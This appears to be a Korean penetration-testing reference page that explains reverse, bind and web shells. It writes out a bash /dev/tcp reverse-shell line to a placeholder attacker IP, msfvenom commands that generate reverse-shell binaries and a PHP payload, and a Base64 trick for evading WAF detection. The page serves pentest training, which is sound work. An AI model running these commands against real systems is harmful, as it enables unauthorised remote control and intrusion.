---
sidebar_position: 1
title: Overview (Payloads)
---

# 페이로드 (Payloads) 및 쉘

## Overview

**페이로드(Payload)**: 익스플로잇 성공 후 대상 시스템에서 공격자가 의도한 최종 작업을 수행하는 코드 조각.
대부분의 모의해킹 및 진단에서 최종 목적은 **쉘(Shell)** 권한 획득으로 귀결됨.

- **주의사항**: 대상 시스템의 가용성에 영향을 주지 않는 안정적인 페이로드를 사용해야 함. 시스템 크래시(Crash)를 유발할 수 있는 불안정한 쉘코드 삽입은 금지.

---

## 1. 쉘(Shell)의 주요 유형

### 리버스 쉘 (Reverse Shell)
타겟 시스템(피해자)에서 공격자의 대기 중인 리스너 포트로 네트워크 연결을 시도하는 형태.
- **장점**: 타겟 시스템 내부의 인바운드 방화벽(Inbound Firewall) 정책을 우회하기 매우 쉬움 (아웃바운드 허용 시)
- **과정**: 공격자 `nc -lvnp 4444` 오픈 → 타겟 시스템에서 `bash -i >& /dev/tcp/<공격자IP>/4444 0>&1` 실행

### 바인드 쉘 (Bind Shell)
타겟 시스템이 특정 포트를 열고 공격자가 해당 포트로 접속(Connect)하기를 기다리는 형태.
- **특징**: 타겟 네트워크의 외부망 방화벽에서 포트 포워딩이나 인바운드 허용이 되어 있어야 접근 가능
- **사용처**: 아웃바운드 트래픽이 전면 차단되어 리버스 쉘이 불가능한 폐쇄망 환경 등

### 웹 쉘 (Web Shell)
웹 서버의 디렉토리에 업로드되어 HTTP 요청을 통해 OS 명령어를 실행할 수 있게 해주는 악성 스크립트.
- **언어별**: `shell.php`, `shell.jsp`, `shell.aspx` 등
- **특징**: 웹 서버 권한(예: `www-data`, `IUSR`)으로 실행되며 쉘 획득의 첫 교두보로 사용됨

---

## 2. 페이로드 생성 자동화 (Msfvenom)

메타스플로잇(Metasploit) 내장 도구인 `msfvenom`을 활용해 타겟 환경에 맞는 실행 파일 형태의 페이로드 생성
```bash
# [Linux] 리버스 쉘 (ELF 바이너리)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<공격자_IP> LPORT=<리스너_포트> -f elf -o shell.elf

# [Windows] 리버스 쉘 (EXE 실행파일)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<공격자_IP> LPORT=<리스너_포트> -f exe -o shell.exe

# [웹 쉘] PHP 리버스 쉘 코드
msfvenom -p php/reverse_php LHOST=<공격자_IP> LPORT=<리스너_포트> -f raw -o shell.php
```

---

## 3. Advanced Techniques (가용성 보호 및 난독화)

### Base64 인코딩 페이로드 (WAF 우회 및 전송)
특수문자 차단이나 악성 페이로드 시그니처 탐지를 피하기 위해 페이로드 원문을 Base64로 인코딩하여 주입 후 대상 서버에서 디코딩
```bash
# 공격자 로컬에서 페이로드 Base64 인코딩
echo -n 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64

# 타겟 서버에서 디코딩 후 실행 유도
echo '<BASE64_STRING>' | base64 -d | bash
```

### 쉘 안정화 (Interactive TTY Upgrade)
획득한 단순(Dumb) 리버스 쉘은 `Ctrl+C` 입력 시 연결이 끊기는 등 매우 불안정함.
작업 중 실수로 쉘이 종료되어 공격을 다시 수행해야 하는 불편함(로그 누적 위험)을 방지하기 위해 TTY 업그레이드 필수.
*(세부 내용은 `Reverse Shell Upgrade` 문서 참고)*

```bash
# Python이 설치된 경우 PTY 생성
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 페이로드 선택 가이드
- **웹 서버 접근 권한(업로드)이 있음**: 웹 쉘 (가장 안정적)
- **아웃바운드 80, 443 포트가 열려 있음**: 리버스 쉘 (포트는 80/443 사용 권장)
- **모든 아웃바운드가 차단됨**: 바인드 쉘 또는 웹 쉘의 결과값 파싱
